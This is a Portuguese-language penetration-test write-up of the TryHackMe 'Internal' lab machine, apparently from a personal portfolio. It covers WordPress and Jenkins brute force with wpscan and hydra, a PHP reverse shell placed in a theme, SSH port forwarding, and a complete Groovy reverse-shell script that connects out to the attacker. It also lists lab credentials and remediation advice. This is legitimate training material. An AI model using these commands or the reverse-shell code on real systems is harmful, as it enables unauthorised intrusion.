<!-- ══════════════════════════ BANNER ══════════════════════════ -->
<div align="center">
  <img src="https://file.loading.io/color/feature/thumb/Blues-8.png?" width="100%" height="10px" alt="divider"/>
</div>

<div align="center">
  <img src="https://www.pulsetechnology.com/hs-fs/hubfs/Cybersecurity%20Graphic.gif?width=1600&height=511&name=Cybersecurity%20Graphic.gif" width="100%" alt="Cybersecurity Banner"/>
</div>

<div align="center">
  <img src="https://file.loading.io/color/feature/thumb/Blues-8.png?" width="100%" height="10px" alt="divider"/>
</div>

<br/>

<h1 align="center">Relatório de Pentest · Máquina "Internal"</h1>
<p align="center"><em>TryHackMe · RabbitSec Red Team</em></p>

<div align="center">

<img src="https://img.shields.io/badge/Plataforma-TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white" alt="thm"/>
<img src="https://img.shields.io/badge/Metodologia-Black--box-000000?style=for-the-badge" alt="metodologia"/>
<img src="https://img.shields.io/badge/Risco-CRÍTICO-d50000?style=for-the-badge" alt="risco"/>
<img src="https://img.shields.io/badge/Resultado-Root-1987F0?style=for-the-badge" alt="resultado"/>

</div>

<!-- ══════════════════════════ NAVEGAÇÃO ══════════════════════════ -->
<div align="center">

<a href="#resumo"><img src="https://img.shields.io/badge/▸_RESUMO-1987F0?style=for-the-badge" alt="resumo"/></a>
<a href="#escopo"><img src="https://img.shields.io/badge/▸_ESCOPO-000000?style=for-the-badge" alt="escopo"/></a>
<a href="#falhas"><img src="https://img.shields.io/badge/▸_FALHAS-1987F0?style=for-the-badge" alt="falhas"/></a>
<a href="#attack-path"><img src="https://img.shields.io/badge/▸_ATTACK_PATH-000000?style=for-the-badge" alt="attackpath"/></a>
<a href="#recomendacoes"><img src="https://img.shields.io/badge/▸_RECOMENDAÇÕES-1987F0?style=for-the-badge" alt="reco"/></a>

</div>

<br/>

<div align="center">

| Classificação | Metodologia | Vetor inicial | Resultado |
|:---:|:---:|:---:|:---:|
| Público (Portfólio) | Black-box · PTES · OWASP | WordPress exposto | Comprometimento total (root) |

</div>

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ RESUMO ══════════════════════════ -->
<a id="resumo"></a>
## Resumo Executivo e Impacto

O alvo **Internal** foi contratado como um teste black-box de pré-produção: um ambiente a três semanas de ir ao ar, sem credenciais fornecidas. Partindo apenas do IP, foi possível encadear credenciais fracas, software desatualizado e um serviço interno sem isolamento até o **comprometimento total do host (shell root)**.

O caminho crítico foi um **WordPress exposto em `/wordpress/`** com senha de administrador trivial. A partir do painel, injetei um reverse shell no tema e obtive acesso como `www-data`. Daí, uma cadeia de credenciais em texto claro espalhadas pelo disco (`/opt/wp-save.txt`, `/opt/note.txt`) e um **Jenkins interno acessível só por túnel SSH** levaram a uma segunda execução de código e, por fim, à senha de root deixada em um arquivo de anotação.

O achado estrutural não é uma CVE isolada: é a **reutilização e o armazenamento de credenciais em texto claro** como tecido conjuntivo de toda a cadeia. Cada pivô dependeu de uma senha que alguém anotou "para não esquecer".

> **Risco:** Crítico · Comprometimento total do servidor antes de entrar em produção.

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ ESCOPO ══════════════════════════ -->
<a id="escopo"></a>
## Escopo e Regras de Engajamento

O cliente autorizou a avaliação sob a ótica de um atacante externo, caixa-preta, com as seguintes regras:

- Ajustar o `hosts` local para resolver `internal.thm`.
- Uso livre de ferramentas e técnicas.
- Localizar e documentar todas as vulnerabilidades.
- Submeter os sinalizadores `user.txt` e `root.txt` como prova de acesso.
- Apenas o IP da máquina atribuída está no escopo. Roleplay desabilitado.

Entregável acordado: resumo executivo, análise de vulnerabilidades, detalhamento das explorações e recomendações de correção, ou seja, o mesmo formato deste documento.

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ FALHAS ══════════════════════════ -->
<a id="falhas"></a>
## Falhas Encontradas

| ID | Título | Severidade | Classe (OWASP) | Papel no ataque |
|----|--------|:----------:|----------------|-----------------|
| **I-01** | Senha de admin do WordPress trivial (`my2boys`) | Crítica | A07:2021 Identificação e Autenticação | Acesso ao painel e injeção de shell |
| **I-02** | Edição de tema habilitada no painel | Alta | A05:2021 Configuração Incorreta | Reverse shell PHP como `www-data` |
| **I-03** | Credenciais em texto claro no disco | Crítica | A04:2021 Design Inseguro | Pivô para `aubreanna` e para root |
| **I-04** | Jenkins interno sem isolamento, senha fraca (`spongebob`) | Crítica | A05:2021 Configuração Incorreta | Execução de código via console Groovy |
| **I-05** | Reutilização de credenciais entre serviços | Alta | A07:2021 Identificação e Autenticação | Encadeamento de todo o acesso |

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ ATTACK PATH ══════════════════════════ -->
<a id="attack-path"></a>
## Caminho de Ataque

### 1. Reconhecimento

```bash
nmap -Pn -A <alvo>
```

Duas portas relevantes:

- `22/tcp` · SSH
- `80/tcp` · Apache httpd 2.4.29 (Ubuntu), servindo a página padrão

### 2. Enumeração de diretórios

```bash
gobuster dir -u http://<alvo>/ -w /usr/share/wordlists/dirb/common.txt
```

Caminhos relevantes: `/blog/`, `/phpmyadmin/`, `/wordpress/`. Os dois últimos abrem superfície de força bruta de autenticação.

### 3. Força bruta no WordPress

```bash
wpscan --url http://internal.thm/wordpress/ \
  --passwords /usr/share/wordlists/rockyou.txt \
  --usernames admin --max-threads 60
```

Resultado: `admin:my2boys`. Dentro do painel, um post privado vazava a próxima pista:

```
Don't forget to reset Wills credentials.
william:arnold147
```

### 4. Foothold: reverse shell no tema

Com os temas Twenty Nineteen/Twenty Twenty desatualizados e a edição de tema liberada, substituí um arquivo PHP do tema por um reverse shell (`php-reverse-shell`) apontando para o listener:

```bash
nc -lvnp 1234
```

Acessar a página do tema disparou a conexão. Acesso obtido como `www-data`.

### 5. Coleta de credenciais local

```bash
cd /opt && cat wp-save.txt
# aubreanna:bubb13guM!@#123
```

Essa senha também autenticava no SSH:

```bash
ssh aubreanna@<alvo>
cat user.txt      # primeiro sinalizador
cat jenkins.txt   # "Internal Jenkins service is running on IP:8080"
```

### 6. Pivô: túnel SSH para o Jenkins interno

O Jenkins só escutava internamente. Encaminhei a porta via SSH:

```bash
ssh -L 1234:127.0.0.1:8080 aubreanna@internal.thm
```

Com o painel acessível em `http://127.0.0.1:1234`, força bruta no formulário de login:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 1234 -V -t 64 -f \
  http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Resultado: `admin:spongebob`.

### 7. RCE via console Groovy

O Jenkins expõe um console Groovy administrativo. Usei-o para abrir um segundo reverse shell (listener em `nc -lvnp 5555`):

```groovy
String host="<meu-ip>"; int port=5555; String cmd="sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(), pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(), so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0) so.write(pi.read());
  while(pe.available()>0) so.write(pe.read());
  while(si.available()>0) po.write(si.read());
  so.flush(); po.flush(); Thread.sleep(50);
  try{p.exitValue(); break;}catch(Exception e){}
}; p.destroy(); s.close();
```

### 8. Escalada para root

Dentro do contexto do Jenkins, `/opt/note.txt` guardava a senha final:

```
Will wanted these credentials secure behind the Jenkins container...
root:tr0ub13gum!@#123
```

```bash
ssh root@<alvo>
cat /root/root.txt   # segundo sinalizador
```

Comprometimento total confirmado.

<div align="center">
  <img src="https://64.media.tumblr.com/f444263be6597f8981d2b9cf3d0c7408/f74decdc69e61f0a-9a/s400x600/a157756e4c56be0e5e51a9e4c79ba781a451e94a.gifv" width="100%" height="2px" alt="divider"/>
</div>

<!-- ══════════════════════════ RECOMENDAÇÕES ══════════════════════════ -->
<a id="recomendacoes"></a>
## Recomendações

| Prioridade | Ação |
|:---:|---|
| P0 | Trocar todas as senhas por valores robustos e únicos por serviço; exigir MFA no WordPress e no Jenkins. |
| P0 | Remover credenciais em texto claro do disco (`/opt`); migrar segredos para um cofre (Vault, SOPS). |
| P1 | Desabilitar a edição de temas/plugins pelo painel (`DISALLOW_FILE_EDIT`). |
| P1 | Isolar o Jenkins em rede de gestão, sem exposição via conta de usuário comum; aplicar RBAC. |
| P2 | Atualizar CMS, temas e Jenkins; manter rotina de patch. |
| P2 | Monitorar tentativas de login e alertar sobre força bruta antes de promover o ambiente a produção. |

<div align="center">
  <img src="https://file.loading.io/color/feature/thumb/Blues-8.png?" width="100%" height="10px" alt="divider"/>
</div>

<div align="center">
<a href="../../README.md"><img src="https://img.shields.io/badge/◂_Voltar_ao_Portfólio-000000?style=for-the-badge&logo=github&logoColor=white" alt="portfolio"/></a>
<a href="https://github.com/douglascshun"><img src="https://img.shields.io/badge/Perfil_GitHub-181717?style=for-the-badge&logo=github&logoColor=white" alt="perfil"/></a>
<a href="https://www.linkedin.com/in/cshunderlick/"><img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="linkedin"/></a>
<a href="https://tryhackme.com/p/D.r4bbi7"><img src="https://img.shields.io/badge/TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white" alt="thm"/></a>
</div>
